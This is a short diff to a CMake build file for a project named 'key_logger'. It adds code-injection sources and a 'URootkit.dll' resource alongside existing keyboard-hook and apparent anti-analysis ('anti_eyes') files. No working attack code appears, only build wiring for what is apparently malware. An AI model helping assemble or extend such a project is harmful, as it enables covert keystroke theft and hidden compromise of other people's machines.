@@ -22,7 +22,11 @@ add_executable (key_logger  "src/main.cpp"
         "src/anti_eyes.cpp"
         "src/key_hook.cpp"
         "include/memory.h"
-        src/memory.cpp)
+        "src/memory.cpp"
+        "include/inject.h"
+        "src/inject.cpp"
+        "resources/resources.rc"
+        "resources/URootkit.dll" )
 
 if (CMAKE_VERSION VERSION_GREATER 3.12)
   set_property(TARGET key_logger PROPERTY CXX_STANDARD 20)
